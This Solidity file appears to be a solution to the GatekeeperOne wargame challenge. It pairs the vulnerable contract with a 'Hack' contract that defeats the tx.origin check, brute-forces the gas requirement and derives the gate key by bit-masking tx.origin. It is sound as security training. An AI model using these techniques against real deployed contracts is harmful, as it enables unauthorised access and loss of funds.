// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        //0x1122334455667788
        //0x55667788 == 0x00007788 not equal !!! so we need to modify the key

        //0x1122334400007788
        //0x00007788 == 0x00007788 equal !!!
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        //0x0000000000007788 != 0x1122334400007788 true and we dont need to modify
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        // we need to make our key final 2 bytes the same as tx.origin
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Hack {
    GatekeeperOne public target;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    function hack() public {
        bytes8 goodkey = generateGoodKey();
        for (uint256 i = 0; i < 8191; i++) {
            // 8191 * 3 is just a base amount to ensure we have enough gas total
            (bool success, ) = address(target).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", goodkey)
            );

            if (success) {
                break;
            }
        }
    }

    function generateGoodKey() public view returns (bytes8) {
        bytes8 key3 = bytes8(uint64(uint160(address(tx.origin))));
        //0xFFFFFFFF0000FFFF
        bytes8 magic = 0xFFFFFFFF0000FFFF;
        bytes8 key = key3 & magic;
        return key;
    }
}
